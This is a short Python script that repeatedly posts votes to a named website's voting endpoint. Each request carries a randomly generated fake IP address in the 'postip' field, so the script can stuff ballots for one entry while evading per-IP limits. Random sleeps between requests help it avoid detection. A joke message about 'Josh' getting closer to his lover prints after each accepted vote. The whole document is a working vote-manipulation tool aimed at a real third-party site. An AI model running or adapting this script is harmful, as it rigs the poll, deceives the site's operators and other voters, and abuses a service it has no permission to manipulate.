import requests
from random import randint
from time import sleep

url = 'http://www.matthewlush.com/VotingSystem/submitVote.php'

vote = 0
while True:
    vote+= 1
    fakeip = str(randint(90,180))+"."+str(randint(90,180))+"."+str(randint(90,180))+"."+str(randint(90,180))
    postVars = { "postperson":7,"postip":fakeip }

    kek = requests.post(url, params=postVars)
    if (kek.text == "Thank you for voting!"):
        print("Josh is " + str(vote) + " " + "votes closer to meeting his lover")
    sleepTime= randint(5,15)
    print ("Waiting for " + str(sleepTime) + " " +  "seconds")
    sleep(sleepTime)
